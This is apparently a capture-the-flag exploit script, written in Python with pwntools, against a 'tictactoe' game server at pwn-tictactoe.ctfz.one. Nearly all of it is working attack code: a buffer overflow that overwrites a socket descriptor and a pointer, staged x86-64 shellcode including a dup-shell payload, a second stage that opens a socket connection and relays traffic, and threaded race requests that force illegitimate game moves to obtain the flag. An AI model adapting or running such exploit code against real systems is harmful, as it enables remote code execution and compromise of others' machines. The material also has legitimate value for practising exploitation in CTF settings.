from pwn import *
import time

def sendshit(shit, sice=False):
  #r = remote("localhost","8889")
  r = remote("pwn-tictactoe.ctfz.one", 8889)
  context.arch = "AMD64"
  #r = process("./tictactoe")
  name = 0x405770

  a = shellcraft.amd64.linux.dupsh(sock='4').rstrip().replace("push rcx\n","push rcx\n\tdec rcx\n").replace("push 2","push 3")
  a = asm(a)

  #0x405720
  b = """mov rsi, rsp
  sub si, 0x980
  mov r10, rsi
  xor rdi, rdi
  add dil, 4
  xor rdx, rdx
  mov dx, 0x480
  xor rax, rax
  syscall
  mov rax, r10
  jmp rax
  """

  #b = """mov rsi, 0x69293e41
  #mov rax, 0x69696969
  #xor rsi, rax
  #xor rdi, rdi
  #add dil, 4
  #xor rdx, rdx
  #add dl, 0x40
  #xor rax, rax
  #inc al
  #syscall"""
  b = asm(b)

  recvall = 0x0000000000402FF5
  sendall = 0x0000000000402F87
  send_reg_user = 0x0000000000402835
  server_ip = 0x000000000405728
  session = 0x0000000000405740
  reg_user = 0x00000000004016B4
  send_state = 0x0000000000402A74
  send_get_flag = 0x0000000000402CE1
  putsplt = 0x0000000000401070

  def call(addr):
    code = """mov rax, {}
  call rax
  """.format(hex(addr))
    return code

  def write(addr, length):
    code = """mov rsi, {}
  mov rdi, 1
  mov rdx, {}
  mov rax, 1
  syscall
  """.format(hex(addr), hex(length))
    return code

  def make_move(cmove, hmove):
    code = """mov rdi, 0x000000000405728
  mov rsi, 0x0000000000405740
  mov rdx, {}
  mov rcx, {}
  """.format(hex(cmove), hex(hmove)) + call(send_state)
    return code

  stage2 = ""

  inetaddr = 0x0000000000401100
  connect = 0x0000000000401180
  socket_init = 0x00000000004011A0

  stage2 += """mov rsi, 0x0000000000405780
  mov DWORD PTR [rsi], 0x0e270002
  mov rdi, 0x000000000405728
  mov rdi, [rdi]
  """ + call(inetaddr) + """
  mov rsi, 0x0000000000405784
  mov DWORD PTR [rsi], eax
  add rsi, 4
  mov QWORD PTR [rsi], 0
  """

  stage2 += """mov rdi, 2
  mov rsi, 1
  mov rdx, 0
  """ + call(socket_init) + """
  mov r10, rax
  mov r12, rax
  mov rdi, r10
  mov rsi, 0x0000000000405780
  mov rdx, 0x10
  """ + call(connect)

  stage2 += """
  loop:
  mov rdi, 4
  mov rsi, 0x4057e0
  mov rdx, 0x200
  xor rax, rax
  syscall
  mov r11, rax

  mov rdi, r12
  mov rsi, 0x4057e0
  mov rdx, r11
  mov rax, 1
  syscall

  mov rdi, r12
  mov rsi, 0x4057e0
  mov rdx, 0x200
  xor rax, rax
  syscall

  mov rdi, 4
  mov rsi, 0x4057e0
  mov rdx, 0x200
  mov rax, 1
  syscall
  jmp loop
  """




  stage2 = asm(stage2)

  shellc = encoders.encode(b,"\n\x00")
  data = ""
  data += shellc
  data += "A"*(0x50-len(data))
  data += p64(0x4) # psock
  data += p64(name) # name
  r.recvuntil(": ", timeout=1)
  r.sendline(data)
  time.sleep(0.1)
  r.sendline(stage2)
  time.sleep(0.1)
  r.sendline(shit)
  if sice:
    temp = r.recvuntil("\x00"*10, timeout=1)
    r.close()
    return temp
  r.close()
def target1(sess):

  success = False
  while not success:
    try:
      print sendshit("2" + sess + "\x01\x00\x00\x00" + "\x02\x00\x00\x00", True)[0]
      success = True
    except:
      pass
  print "FIRST"
def target2(sess):

  success = False
  while not success:
    try:
      print sendshit("2" + sess + "\x04\x00\x00\x00" + "\x05\x00\x00\x00", True)[0]
      success = True
    except:
      pass
  print "SECOND"
def target3(sess):

  success = False
  while not success:
    try:
      print sendshit("2" + sess + "\x03\x00\x00\x00" + "\x08\x00\x00\x00", True)[0]
      success = True
    except:
      pass
  print "THIRD"


sess = sendshit("1", True)[4:4+32]
print sess
for i in range(100):
  print i
  t1 = threading.Thread(target=target1, args=(sess,))
  t2 = threading.Thread(target=target2, args=(sess,))
  t3 = threading.Thread(target=target3, args=(sess,))
  t1.start()
  t2.start()
  t3.start()
  t1.join()
  t2.join()
  t3.join()
print sendshit("3" + sess, True)#
